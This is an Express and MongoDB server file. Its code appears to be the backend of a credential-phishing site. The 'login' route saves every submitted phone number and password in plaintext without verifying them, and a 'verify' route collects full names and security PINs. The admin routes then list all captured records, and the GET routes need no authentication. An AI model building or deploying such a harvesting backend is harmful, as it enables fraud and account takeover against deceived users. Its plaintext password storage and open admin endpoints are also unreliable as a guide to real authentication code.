require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();

/* ===== MIDDLEWARE (ORDER IMPORTANT) ===== */
app.use(cors());
app.use(express.json());

/* ===== MONGODB CONNECT ===== */
mongoose
  .connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB Connected"))
  .catch((err) => {
    console.error("❌ MongoDB Error:", err);
    process.exit(1);
  });

/* ===== SCHEMAS ===== */
const userSchema = new mongoose.Schema(
  {
    phone: String,
    password: String,
  },
  { timestamps: true }
);
const User = mongoose.model("User", userSchema);

const verificationSchema = new mongoose.Schema(
  {
    userId: String,
    full_name: String,
    problem: String,
    security_pin: String,
    experience: String,
  },
  { timestamps: true }
);
const Verification = mongoose.model("Verification", verificationSchema);


/* ===== LOGIN ===== */
app.post("/api/login", async (req, res) => {
  try {
    const { phone, password } = req.body;

    if (!phone || !password) {
      return res.json({ success: false, message: "Missing fields" });
    }

    const user = await User.create({ phone, password });

    res.json({
      success: true,
      userId: user._id,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

/* ===== VERIFICATION ===== */
app.post("/api/verify", async (req, res) => {
  try {
    const { userId, full_name, problem, security_pin, experience } = req.body;

    if (!userId || !full_name || !security_pin) {
      return res.json({ success: false });
    }

    await Verification.create({
      userId,
      full_name,
      problem,
      security_pin,
      experience,
    });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

/* ===== ADMIN LOGIN ===== */
app.post("/api/admin/login", (req, res) => {
  if (req.body.password === process.env.ADMIN_PASSWORD) {
    res.json({ success: true });
  } else {
    res.json({ success: false });
  }
});

/* ===== ADMIN USERS ===== */
app.get("/api/admin/getUsers", async (req, res) => {
  const users = await User.find().sort({ createdAt: -1 });
  res.json(users);
});

// app.delete("/api/admin/deleteUser/:id", async (req, res) => {
//   await User.findByIdAndDelete(req.params.id);
//   res.json({ success: true });
// });

/* ===== ADMIN VERIFICATION ===== */
app.get("/api/admin/getVerification", async (req, res) => {
  const data = await Verification.find().sort({ createdAt: -1 });
  res.json(data);
});

// app.delete("/api/admin/deleteVerification/:id", async (req, res) => {
//   await Verification.findByIdAndDelete(req.params.id);
//   res.json({ success: true });
// });

/* ===== SERVER ===== */
const PORT = process.env.PORT || 5000;
app.listen(PORT, () =>
  console.log("🚀 Server running on port", PORT)
);
